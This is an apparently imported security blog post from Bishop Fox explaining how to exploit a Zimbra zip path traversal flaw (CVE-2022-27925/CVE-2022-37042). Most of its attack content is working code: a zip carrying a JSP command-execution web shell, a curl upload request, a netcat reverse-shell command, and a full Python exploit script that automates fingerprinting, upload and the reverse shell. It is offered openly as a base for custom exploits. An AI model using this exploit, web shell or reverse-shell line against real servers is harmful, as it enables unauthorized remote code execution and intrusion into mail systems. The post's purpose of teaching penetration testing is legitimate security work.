---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-21_what-the-vuln-zimbra.md
original_filename: 2023-02-21_what-the-vuln-zimbra.md
title: 'What the Vuln: Zimbra'
category: documents
detected_topics:
- command-injection
- idor
- file-upload
- path-traversal
- otp
- rate-limit
tags:
- imported
- documents
- command-injection
- idor
- file-upload
- path-traversal
- otp
- rate-limit
language: en
raw_sha256: fdd4a9905a683711d31a6e58c947d607571ed5839eff722377baa5345f2bd7f6
text_sha256: c8a65539b6ff55f8c13e3f5ca7d9239762627b78b00e7cf2f575e892da3aa8c3
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# What the Vuln: Zimbra

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-21_what-the-vuln-zimbra.md
- Source Type: markdown
- Detected Topics: command-injection, idor, file-upload, path-traversal, otp, rate-limit
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `fdd4a9905a683711d31a6e58c947d607571ed5839eff722377baa5345f2bd7f6`
- Text SHA256: `c8a65539b6ff55f8c13e3f5ca7d9239762627b78b00e7cf2f575e892da3aa8c3`


## Content

---
title: "What the Vuln: Zimbra"
page_title: "What the Vuln: Zimbra | Bishop Fox"
url: "https://bishopfox.com/blog/what-the-vuln-zimbra"
final_url: "https://bishopfox.com/blog/what-the-vuln-zimbra"
authors: ["Carlos Yanez"]
bugs: ["Zip Slip attack", "Path traversal"]
publication_date: "2023-02-21"
added_date: "2023-02-26"
source: "pentester.land/writeups.json"
original_index: 1501
---

Share

[ ](https://www.facebook.com/share.php?u=https://bishopfox.com/blog/what-the-vuln-zimbra&amp;utm_medium=social&amp;utm_source=facebook) [ ](https://twitter.com/intent/tweet?url=https://bishopfox.com/blog/what-the-vuln-zimbra&utm_medium=social&utm_source=twitter&source=tweetbutton&text=) [ ](http://www.linkedin.com/shareArticle?mini=true&url=https://bishopfox.com/blog/what-the-vuln-zimbra&utm_medium=social&utm_source=linkedin) [ ](/feeds/technology.rss)

What the Vuln is a new series where in each episode our offensive security experts and hackers deep dive and zero-in on one specific vulnerability that plagues organizations – from origins and technical components to how pen testers can find and exploit the vulnerability. The first episode of our series will explore Zimbra.

  

## Background

Zimbra is a web-based email, calendar, and collaboration suite launched in July 2005. In April 2022, security researchers discovered that Zimbra Collaboration Suite (ZCS) Network Edition versions 8.8.15 Patch 30 and below, as well as versions 9.0.0 Patch 23 and below, are unprotected against a path traversal vulnerability. [CVE-2022-27925](https://nvd.nist.gov/vuln/detail/CVE-2022-27925) was assigned to this vulnerability. 

Zimbra Collaboration Suite Network Edition includes functionality that allows customers to receive a ZIP archive and extract its contents to an arbitrary location on the host due to the path traversal vulnerability. This could be leveraged by hackers to achieve remote code execution on the target system. Note that the open-source edition is not affected.

While the path traversal vulnerability was first published last year, it has gained more traction, especially since working exploits have been published lately to achieve remote code execution.

An additional variant that could bypass authentication was later issued under [CVE-2022-37042](https://nvd.nist.gov/vuln/detail/CVE-2022-37042) and even a configurable click-to-run Metasploit module was made available.

  

## Finding the Zimbra Version

Our first step towards exploitation is to detect if the server in question is vulnerable. During our analysis, we used several enumeration techniques to try to identify the exact version of Zimbra that is currently running on the server.

As a starting point, we’ll take a detailed look through the ZCS source code and try to find where the version number is displayed.

ZCS Network Edition version 8.8.12 was used during the creation of this blog post, so keep that in mind as that will be the number we’ll be looking for and appearing during the enumeration results.

Since we’re looking for a file that can help us discover the version number from a publicly accessible place, it makes sense to inspect only publicly accessible folders. This will restrict our search to the `/opt/zimbra/jetty_base/webapps/zimbra` folder.

We’ll make use of the good ol’ grep tool to find the version string:

  

  
  
  zimbra@zimbra:/opt/zimbra/jetty_base/webapps/zimbra# grep -rn "8\.8\.12" . –color
  …omitted for brevity…
  ./downloads/.git/HEAD:1:ref: refs/heads/release/8.8.12
  ./js/zimbraMail/share/model/ZmSettings.js:849:	this.registerSetting("CLIENT_VERSION",  {type:ZmSetting.T_CONFIG, defaultValue:"8.8.12_GA_3844"});
  ./js/Startup1_2_all.js:2135:	this.registerSetting("CLIENT_VERSION",  {type:ZmSetting.T_CONFIG, defaultValue:"8.8.12_GA_3844"});
  ./js/NewWindow_2_all.js:21273:	this.registerSetting("CLIENT_VERSION",  {type:ZmSetting.T_CONFIG, defaultValue:"8.8.12_GA_3844"});
  ./help/.git/config:11:	merge = refs/heads/release/8.8.12
  …omitted for brevity…

Multiple matches are returned by grep; however, we can discard `.git` and downloads folders since they are not accessible by default. The `.git` folder probably would not be there on a production server and `downloads/` is protected by basic authentication which we could try to crack, but we’ll leave it out for the purpose of this blog post.

This leaves us with three JavaScript files that, luckily for us, are publicly accessible and contain the exact version number of the Zimbra Collaboration Suite server.

The Zimbra web client interface allows us to access the files that can be used for fingerprinting; most of the time these files will be available since they are part of the web application section that is exposed to the public.

Browsing to the domain where ZCS is installed will reveal the web interface where you can subsequently look for the mentioned files.

![Zimbra web interface with username and password fields.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Zimbra-Figure-1.png)FIGURE 2 - Zimbra web interface

The files to search for are the following:

  * <https://example.com/js/zimbraMail/share/model/ZmSettings.js>
  * <https://example.com/js/Startup1_2_all.js>
  * <https://example.com/js/NewWindow_2_all.js>

Browsing to one of the JavaScript files listed above will display some configuration settings, as well as the current version which can be seen written near the `CLIENT_VERSION` setting:
  
  
  …omitted for brevity…
  this.registerSetting("CLIENT_DATETIME",  {type:ZmSetting.T_CONFIG, defaultValue:"20190819-0717"});
  this.registerSetting("CLIENT_RELEASE",  {type:ZmSetting.T_CONFIG, defaultValue:"20190819064612"});
  this.registerSetting("CLIENT_VERSION",  {type:ZmSetting.T_CONFIG, defaultValue:"8.8.12_GA_3844"});
  this.registerSetting("CONFIG_PATH",  {type:ZmSetting.T_CONFIG, defaultValue:appContextPath + "/js/zimbraMail/config"});
  …omitted for brevity…

This is a crucial step that will help us save time and resources before sending the actual exploit payload or just sending it without knowing if the version is vulnerable and just hoping it works.

## Network Edition

Finding a vulnerable version puts us in the right track; nevertheless, we need to confirm that the Zimbra server is in fact the Network Edition since the open-source version is not vulnerable to this path traversal attack.

To verify this, we will use grep once again to investigate the source and try to find some clues:
  
  
  zimbra@zimbra:/opt/zimbra/jetty_base/webapps# grep -rnw "network edition" . –color
  ./zimbra/public/login.jsp:61:  // Touch client exists only in network edition
  ./zimbraAdmin/help/en_US/delegated/delegated_admin/help_search.htm:88:<p>The results displayed are based on whether ZCS is the network edition 
  ./zimbraAdmin/help/en_US/admin/html/search/help_search.htm:114:<p>The results displayed are based on whether ZCSis the network edition or the open source edition.</p>
  ./zimbraAdmin/help/en_US/admin/search/help_search.htm:130:<p>The results displayed are based on whether ZCSis the network edition or the open source edition.</p>

By looking at the results, we can infer that the login.jsp page is the target that most likely will help us because it can be browsed easily and without authentication. Notice the comment stating that the Touch version of ZCS is only available in the Network Edition.

Using the browser, we can access the login page again and look for the Version dropdown menu; clicking it will show the available options, amongst them we can find that the Touch option is included, confirming that this server is in fact the Network Edition of ZCS.

![Zimbra web interface displaying Touch option](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Zimbra-Figure-2.png)FIGURE 2- Zimbra web interface displaying Touch option

## Getting a Valid Username

Now, we can continue gathering information for our exploit to work. A valid username is required for the final request, so we’ll need to find a real user.

Several methods can be used to achieve this goal, such as google dorks, social engineering, or a plain and simple process such as looking at the contact page in the main website.

Fortunately, almost every installation of ZCS does not remove the original admin user created while setting up the server, so the chances of it being a valid user are very high.

## ZIP Path Traversal

Zip path traversal also called Zip Slip is a vulnerability that occurs when extracting an archive with path traversal filenames (i.e. ../ paths), usually results in remote code execution. This not only affects Zip files but also bzip2, xz, tar, jar, war, cpio, apk, rar, and 7z.

Like a regular path traversal, it allows an attacker to traverse out of the expected location on the local file system and read from or write to an unexpected location.

With the valid username in place, we can move on to create the ZIP file that will trigger the path traversal vulnerability. To do this, we need to research where in the Zimbra server we are allowed to write files - and most importantly - read them, as that will be needed for remote code execution.

We could use basic enumeration techniques and tools such as `Ffuf` or `GoBuster` to find files and directories and try to locate a viable path via trial and error. However, this could take an unnecessary amount of time that we can use for debugging the exploit itself, so let’s choose another method.

Let’s go back again to the source code and look for public and writable folders. Once again, we will use the `/opt/zimbra/jetty_base/webapps/zimbraAdmin/` path as our starting point:
  
  
  zimbra@zimbra:/opt/zimbra/jetty_base/webapps/zimbraAdmin# ls -l
  drwxr-xr-x 2 zimbra zimbra 4096 META-INF
  drwxr-xr-x 4 zimbra zimbra 4096 WEB-INF
  drwxr-xr-x 2 zimbra zimbra 4096 css
  drwxrwxr-x 3 zimbra zimbra 4096 help
  drwxr-xr-x 4 zimbra zimbra 4096 img
  drwxr-xr-x 5 zimbra zimbra 4096 js
  drwxr-xr-x 3 zimbra zimbra 4096 public
  drwxr-xr-x 6 zimbra zimbra 4096 skins
  drwxr-xr-x 5 zimbra zimbra 4096 templates
  drwxr-xr-x 3 zimbra zimbra 4096 yui

A folder named public seems like an excellent option for our use case; let’s see if it is in fact storing public files:
  
  
  zimbra@zimbra:/opt/zimbra/jetty_base/webapps/zimbraAdmin# ls -l public/
  -rw-r--r-- 1 zimbra zimbra  1521 404.html
  -rw-r--r-- 1 zimbra zimbra  1534 5xx.html
  -rw-r--r-- 1 zimbra zimbra  2330 Boot.jsp
  -rw-r--r-- 1 zimbra zimbra  7845 Docs.jsp
  -rw-r--r-- 1 zimbra zimbra  4163 Offline.jsp
  -rw-r--r-- 1 zimbra zimbra  2780 Resources.jsp
  -rw-r--r-- 1 zimbra zimbra 11334 admin.jsp
  -rw-r--r-- 1 zimbra zimbra  1389 blank.html
  -rw-r--r-- 1 zimbra zimbra  2789 blankHistory.html
  -rw-r--r-- 1 zimbra zimbra  2131 empty.html
  -rw-r--r-- 1 zimbra zimbra  1710 insecureResponse.jsp
  drwxr-xr-x 2 zimbra zimbra  4096 jsp
  -rw-r--r-- 1 zimbra zimbra  2293 launch.html
  -rw-r--r-- 1 zimbra zimbra  1531 loadImgData.jsp
  -rw-r--r-- 1 zimbra zimbra  2959 noscript.jsp
  -rw-r--r-- 1 zimbra zimbra  1143 pre-cache.jsp
  -rw-r--r-- 1 zimbra zimbra 10455 secureRequest.jsp

We can confirm it has publicly accessible files by trying to access its contents in the browser:

![blankHistory.html displayed in the browser](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Zimbra-Figure-3.png)FIGURE 3 - blankHistory.html displayed in the browser

## Zip file

Now we can create the Zip file with the path traversal string included in the contents file name.

For the payload, you can use a tool like `sliver` or `msfvenom` to create a custom port binding shellcode to the attack machine or upload a simple file that will read and execute the command passed to a GET request. In this blog post, we’ll be using the latter version, and since the Zimbra web interface itself is written in JSP, we’ll use that file type to achieve remote code execution. Let’s proceed to create the zip file.

There are several ways to create a zip file with path traversal elements such as `evilarc` or the `slipit` tools. In this case, we chose to do it manually using plain Python.

You can look at the code to create the file below:
  
  
  from zipfile import ZipFile 
  with ZipFile('bf.zip', 'w') as f:
  f.writestr('../../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbraAdmin/public/bf.jsp', '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>')

We can verify its contents by running the following bash command:
  
  
  carlosyanez@bishopfox% unzip -l bf.zip
  Archive:  bf.zip
  Length  Date  Time  Name
  ---------  ---------- -----  ----
  59  10-11-2022 11:32  ../../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbraAdmin/public/bf.jsp
  ---------  -------
  59  1 file

## Sending the Request

It’s time to perform a request to send the zip file to the server. We’ll send a `POST` request using `curl` with the file attached to it.

Keep in mind that to successfully trigger the vulnerability, our zip needs to be sent as `data-binary`. Otherwise, the server will fail to correctly process the data, and no file will be created in the public folder.

You can see the complete curl command below:
  
  
  curl --data-binary "@bf.zip" "https://example.com/service/extension/backup/mboximport?account-name=admin&ow=1&no-switch=1&append=1"

  

## Check Response

Since this is a vulnerability that can be exploited without authentication, a successful request will not return 200 as one would expect; instead, a 401 response should be returned from a successful request, as seen below:
  
  
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
  <title>Error 401 no authtoken cookie</title>
  </head>
  <body><h2>HTTP ERROR 401</h2>
  <p>Problem accessing /service/extension/backup/mboximport. Reason:
  <pre> no authtoken cookie</pre></p>
  </body>
  </html>

  

Any other response code such as 404 will indicate the vulnerability was not triggered and that the target is probably not vulnerable. Unless of course, you are, in fact, authenticated with a valid user and send the request with the correct auth token which will return a 200-response code.

## Browse to Shell

After successfully sending the zip file, the Zimbra server will extract it automatically and place it in the path traversal location set in the file name. Navigate to the specified URL, and write a command to confirm.

Keep in mind that the JSP code we sent does not return any output to the browser so you need to verify execution using another method such as a DNS request or if you’re feeling adventurous, you can send the reverse shell of your choice at this point:

**Request:**
  
  
  https://example.com/zimbraAdmin/public/bf.jsp?cmd=nc -e /bin/bash 10.0.0.1 4444

**Response:**
  
  
  carlosyanez@bishopfox% nc -lnv 4444
  zimbra@zimbra:/opt/zimbra/jetty_base/webapps/zimbraAdmin/public# uname -a
  Linux zimbra.bf 5.10.124-linuxkit x86_64 GNU/Linux

## Creating an Exploit

Now that we successfully accomplished triggering the path traversal vulnerability and achieved remote code execution, it would be a good idea to create a script to automate all the necessary steps to reproduce it against other targets and avoid performing all tasks manually each time.

Here is what a Python proof of concept looks like:
  
  
  #!/usr/bin/env python3
  
  # Usage: ./zimbra-CVE-2022-37042.py [hostname/ip] [lhost] [lport] [[username:optional]
  
  from io import BytesIO
  import requests
  import zipfile
  import sys
  import re
  
  requests.packages.urllib3.disable_warnings()
  target = sys.argv[1]
  lhost = sys.argv[2]
  lport = sys.argv[3]
  username = sys.argv[4] if len(sys.argv) > 4 else "admin"
  
  # Get server version
  r = requests.get(f"https://{target}/js/Startup1_2_all.js", verify=False)
  version = re.search("\d\.\d+\.\d+", r.text)[0]
  print(f"Detected version: {version}")
  
  # Check for network edition
  r = requests.get(f"https://{target}", verify=False)
  try:
  re.search("Touch</option>", r.text)[0]
  print("Network Edition confirmed...")
  except:
  print('Could not detect Network Edition, target is not vulnerable or try manually')
  exit(0)
  
  # Create ZIP file
  print("Creating ZIP file...")
  f = BytesIO()
  z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
  z.writestr('../../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbraAdmin/public/bf.jsp', '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>')
  z.close()
  
  # Send request
  print(f"Sending request with {username} as username...")
  r = requests.post(url=f'https://{target}/service/extension/backup/mboximport?account-name={username}&ow=1&no-switch=1&append=1', data=f.getvalue(), verify=False)
  print(f"Correct response: {r.status_code}")
  
  # Load uploaded file and wait for shell
  print("Getting shell...")
  r = requests.get(f"https://{target}/zimbraAdmin/public/bf.jsp?cmd=nc -e /bin/bash {lhost} {lport}", verify=False)
  if r.status_code == 200:
  print("200... Reverse shell successfully executed")
  else:
  print(f"Something went wrong, response code: {r.status_code}")

Now we can set up a netcat listener and run the script:

**Request:**
  
  
  carlosyanez@bishopfox% ./zimbra-CVE-2022-37042.py zimbra.bf 10.10.0.1 4444
  Detected version: 8.8.12
  Network Edition confirmed...
  Creating ZIP file...
  Sending request with admin as username...
  Correct response: 401
  Getting shell...
  200... Reverse shell successfully executed

**Response:**
  
  
  carlosyanez@bishopfox% nc -lnv 4444
  zimbra@zimbra:/opt/zimbra/jetty_base/webapps/zimbraAdmin/public# uname -a
  Linux zimbra.bf 5.10.124-linuxkit x86_64 GNU/Linux

Feel free to use this PoC as a foundation for your custom exploit and to improve on it.

## Conclusion

In this What the Vuln blog post, we dove into the Zimbra CVE-2022-27925/CVE-2022-37042 Zimbra Zip Path Traversal vulnerability and discovered how issues such as this one can be exploited from scratch, from target reconnaissance to an automated proof of concept exploit script. Additionally, these techniques can be applied to other kinds of vulnerabilities and can serve as a starting point for vulnerability discovery and exploit development.

To see this vulnerability in action and get even more details, listen to my [livestream](https://bishopfox.com/resources/what-the-vuln-zimbra-webcast) with [Joe Sechman](https://bishopfox.com/authors/joe-sechman), AVP of Research & Development.  

* * *

![Headshot BF Carlos Yanez](https://assets.bishopfox.com/prod-1437/Images/author-photos/Headshot_BF-CarlosYanez.jpg)

By Carlos Yanez 

Carlos Yanez (CISSP, OSWE, OSCP, GWAPT, CNVP, eMAPT, MCPT) is a Senior Security Consultant at Bishop Fox. His focus areas include web and desktop [application assessments](https://bishopfox.com/services/penetration-testing-services/application-penetration-testing), [source code review](https://bishopfox.com/services/penetration-testing-services/secure-code-review), [cloud penetration tests](https://bishopfox.com/services/penetration-testing-services/cloud-penetration-testing), [product security reviews](https://bishopfox.com/services/penetration-testing-services/product-security-review), as well as [mobile devices penetration tests](https://bishopfox.com/services/penetration-testing-services/mobile-application-assessment). Prior to joining Bishop Fox, he worked on multiple e-commerce platforms as a Penetration Tester and spent years as a Web Developer and Systems Administrator. When AFK, he enjoys spending time with family and friends, lockpicking, and playing guitar.

[ More by Carlos Yanez  ](https://bishopfox.com/authors/carlos-yanez)

![](/static/assets/images/backgrounds/lander-header-bg-black-lines.svg)

Subscribe to our blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.
